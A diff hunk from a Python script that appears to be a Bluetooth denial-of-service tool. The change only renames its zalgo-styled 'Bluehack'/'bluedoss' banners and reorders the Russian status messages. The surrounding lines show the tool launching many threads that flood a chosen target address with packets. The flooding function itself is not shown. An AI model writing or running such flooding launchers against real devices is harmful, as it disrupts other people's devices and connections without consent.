@@ -47,15 +47,14 @@ def main():
             exit(0)
         print('')
         os.system('clear')
-
-        print('[B̪̟̟l̻̫̦u͉̼͙e͉̼̝h̞̪͎a͕̞̪c͚͚͜k̠̪] Построение потоков...\n')
+        print('[b̻͚̟l̡̺u͓͔e͖͖̙d̙̠͍d̠͉̘o͍̪̙s͇͎̫] Стартуем!')
+        print('[b̻͚̟l̡̺u͓͔e͖͖̙d̙̠͍d̠͉̘o͍̪̙s͇͎̫] Построение потоков...\n')
 
         for i in range(0, threads_count):
             print('[*] Built thread №' + str(i + 1))
             threading.Thread(target=DOS, args=[str(target_addr), str(packages_size)]).start()
 
-        print('[B̪̟̟l̻̫̦u͉̼͙e͉̼̝h̞̪͎a͕̞̪c͚͚͜k̠̪] Построил все потоки...')
-        print('[B̪̟̟l̻̫̦u͉̼͙e͉̼̝h̞̪͎a͕̞̪c͚͚͜k̠̪] Стартуем!')
+        print('[b̻͚̟l̡̺u͓͔e͖͖̙d̙̠͍d̠͉̘o͍̪̙s͇͎̫] Построил все потоки...')
     else:
         print('Bip bip')
         exit(0)
